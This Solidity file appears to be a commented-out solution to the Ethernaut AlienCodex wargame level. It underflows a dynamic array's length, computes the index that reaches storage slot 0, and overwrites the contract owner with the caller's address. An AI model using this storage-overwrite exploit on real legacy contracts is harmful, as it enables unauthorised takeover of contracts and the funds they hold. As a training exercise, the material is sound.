/*
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;


import "../contract/AlienCodex.sol";


    // We need to use remix because this version of solidity is old
    // https://remix.ethereum.org/


contract AlienHack {
    // Complete with instance's address
    AlienCodex originalContract = AlienCodex(0x60930cB957654797928053694509EB40D7C59432);

    function hack () external {
        // We need to make contact first in order to use the retract function
        originalContract.make_contact();
        // We're modifiyng the length of the array without checking an underflow
        // So we're gonna make this underflow happen
        originalContract.retract();

        // You need to calculate codex index corresponding to slot 0
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));

        // This way you're overwriting the variable owner with your address
        originalContract.revise(index, myAddress);
    }
}

*/